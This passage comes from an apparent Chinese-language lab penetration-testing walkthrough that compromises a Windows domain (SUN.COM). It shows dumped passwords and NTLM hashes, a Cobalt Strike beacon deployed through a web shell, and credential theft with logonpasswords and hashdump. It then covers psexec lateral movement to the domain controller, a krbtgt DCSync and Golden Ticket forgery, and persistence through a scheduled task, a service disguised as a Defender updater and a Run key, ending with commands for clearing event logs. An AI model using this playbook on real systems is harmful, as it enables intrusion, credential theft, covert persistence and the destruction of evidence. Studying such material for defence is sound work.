	 * Password : b1 6c a7 36 c4 b9 23 6f 04 45 96 94 42 47 05 03 a3 35 a0 41 fe aa e0 92 b2 61 32 d1 c5 cf 8e 55 a1 52 1e 34 ee 31 7b d3 82 2d 20 f2 53 9f cb 75 f3 8f 9e 74 de d7 cc 37 06 53 3a e5 64 b1 d5 be 59 0c 8e 0d cd 0a 5f 7e fd b2 ba 6a d3 81 2e d4 f8 99 0f 42 66 88 15 01 40 05 ab 70 d9 04 0c 88 09 e2 5b fe 18 81 4e a8 52 c1 65 81 65 ac c8 c3 43 81 ff 59 cd c4 77 fe 9a 19 f7 4b db 36 97 f9 31 4e a3 c3 36 ba c7 a9 b5 c8 59 dc 29 ec f3 34 1a 83 c1 ab a1 63 d4 6e cb c6 8a 78 d0 23 80 de 30 0a d7 82 d1 73 a7 1a 15 1a 53 c9 6d 7b 54 73 08 69 8e 1d 21 df 5b 56 0b 50 ce fe 6f 89 a8 4c f5 8d 37 0f 10 54 44 6a 33 65 a0 fa 1d c7 88 d4 ff b0 cc 27 65 98 17 7f 29 94 e4 d9 62 aa 43 12 ca a7 49 56 95 b3 48 98 b4 41 24 59 db 8a 03 00 
	ssp :	
	credman :	

meterpreter > 

```

<font style="color:rgb(35, 57, 77);"></font>

<font style="color:rgb(35, 57, 77);"></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456562.png)

<font style="color:rgb(35, 57, 77);"></font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457843.png)

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

+ **域管理员 (Administrator)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">dc123.com</font>`
    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">e8bea972b3549868cecd667a64a6ac46</font>`
    - **所属域**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">SUN.COM</font>`
+ **普通用户 (leo)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">123.com</font>`
    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">afffeba176210fad4628f0524bfe1942</font>`

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

## 上线 CS
除了用蚁剑连接上线 msf，还可以用 CS：

### CS 部署方式
> # CS 部署方式
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081501131.png)
>
> ## 服务端（kali）
> 将天狐工具箱中的 CS 上传到 kali:
>
> 
>
> 赋予执行权限：
>
>  `sudo chmod -R +x ~/workspace/cs4.7/Cobalt_Strike_4.7`  
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500375.png)
>
> ###  Kali 端启动 TeamServer  
>  TeamServer 是所有攻击的中转站。  
>
> `sudo ./teamserver <kali-IP> <连接密码>`
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500106.png)
>
> ##  Windows 客户端连接  
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457231.png)
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457827.png)
>
> ## 创建监听器
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459189.png)
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459244.png)
>
> ## 生成木马
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500271.png)
>
> <!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500223.png)之后选择保存文件地址
>
> 
>



可以直接利用蚁剑把文件上传

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457201.png)



通过蚁剑执行 beacon.exe 成功上线 CS：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459150.png)

### CS 常用命令：
> # CS 常用命令：
> 解决延迟：`sleep 0`
>
> 运行 Windows 的原生命令要在前面加`shell`
>
> + `shell whoami`
> + ****`shell ipconfig /all`
> + `shell net user`
>
> **抓取明文密码**：`logonpasswords` 
>
> **抓取哈希**：`hashdump`
>
> **扫描网段和端口**：`portscan [目标IP/网段] [端口列表] [扫描类型] [并发数]`  
>

#### 抓取明文密码：`logonpasswords` 
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459561.png)



也可以用 **视图->密码凭证 **，所有被抓到的账号和密码都在这里

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458458.png)



### 内网信息收集
#### <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">扫描内网网段</font>
` portscan 192.168.138.0/24  `

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458679.png)





<font style="color:rgb(35, 57, 77);"></font>

# <font style="color:rgb(35, 57, 77);">内网横向移动</font>
## <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">psexec64连接域控</font>
  
 首先要有域管理员的凭据：

+ **域管理员 (Administrator)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">dc123.com</font>`
    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">e8bea972b3549868cecd667a64a6ac46</font>`
    - **所属域**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">SUN.COM</font>`

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 配置监听器</font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 由于域控通常在内网深处，无法直接连接 Kali 外网 IP，创建一个 </font>**SMB Beacon**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 监听器  </font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500818.png)

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">接下来在 </font>**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">视图->目标列表</font>**

就可以看到域控了：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458517.png)

**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">右键->横向移动->psexec64</font>**

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459876.png)

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">填入账号密码，选择监听器</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456116.png)

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">选择会话</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456646.png)

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">成功控制域控机器</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500749.png)





# 权限维持
### 1. 域控专属：黄金票据 (Golden Ticket) —— 最隐蔽
这是域渗透的“终极权限”。只要拿到域内 `krbtgt` 用户的哈希，你就可以伪造任何用户的身份（包括域管），且不受密码修改的影响。

#### 域内 `krbtgt` 用户的哈希  
在域控的 Beacon 上运行：`hashdump` 或 `mimikatz lsadump::dcsync /domain:SUN.COM /user:krbtgt`。<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456555.png)



> `**krbtgt:502:aad3b435b51404eeaad3b435b51404ee:65dc23a67f31503698981f2665f9d858:::**`
>
> 数据的格式是：`用户名 : RID : LM哈希 : NTLM哈希 :::`
>
> + **用户名**: `krbtgt`
> + **RID**: `502` (这是 krbtgt 账号的固定标识)
> + **LM哈希**: `aad3b435b51404eeaad3b435b51404ee` (这是空密码或者禁用 LM 时的占位符)
> + **NTLM哈希**: `**65dc23a67f31503698981f2665f9d858**` (这是我们要用的**核心数据**)
>





#### 域 SID 获取： `shell whoami /user`
这里会出现一个问题，因为当前已经处于 `**SYSTEM**` 权限（SID 为 `S-1-5-18`），它是本地系统的最高权限，**但它不是域用户，所以通过它查不到域的 SID**。

要获取域 SID，我们需要查询域内用户的信息。

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459167.png)



**最简单的 WMI 查询**： `shell wmic useraccount where name='Administrator' get sid`

**查询域控制器信息**： `shell net group "domain admins" /domain`



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459442.png)



获得 SID：`S-1-5-21-3388020223-1982701712-4030140183`  （要去掉后面的 500）



#### 黄金票据
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459236.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458321.png)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456737.png)



`Golden ticket for 'krbtgt @ SUN.COM' successfully submitted for current session`，说明 Mimikatz 已经成功伪造了这张黄金票据，并将其直接塞进了当前 Beacon 进程的内存里。  



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458838.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456432.png)





> 用 CS 工具确实比 msf 手注方便不少啊 ---
>



### 2. 系统级维持：计划任务 (Scheduled Tasks) —— 最常用
利用 Windows 的 `schtasks` 定时运行你的木马。

**Beacon 命令**：

```plain
# 每当系统启动时运行木马
shell schtasks /create /tn "MicrosoftUpdater" /tr "C:\Windows\Temp\beacon.exe" /sc onstart /ru system
```

+ **图形化操作**： 在 Beacon 右键 -> `Explore` -> `Browser` 上传木马到系统目录，然后手动输入上述命令。

---

### 3. 服务维持 (Service Persistence) —— 权限最高
创建一个开机自启动的服务，由于服务通常以 `SYSTEM` 权限运行，稳定性极高。

**Beacon 命令**：

```plain
# 创建名为 WinDefendUpdater 的服务
shell sc create "WinDefendUpdater" binpath= "C:\Windows\Temp\beacon.exe" start= auto
shell sc description "WinDefendUpdater" "Windows Defender 核心更新组件"
shell sc start "WinDefendUpdater"
```

---

### 4. 注册表维持 (Registry Run Keys)
修改注册表的启动项，用户每次登录时都会触发木马。

**命令**：

```plain
shell reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
```

# <font style="color:rgb(35, 57, 77);">日志清除</font>
<font style="color:rgb(35, 57, 77);">日志清除有两种方法，一种是使用kali里面自带的命令进行日志清除</font>

```plain
run event_manager -i

run event_manager -c
```





<font style="color:rgb(35, 57, 77);">第二种方法则是进入服务器管理器自行清除</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457591.png)

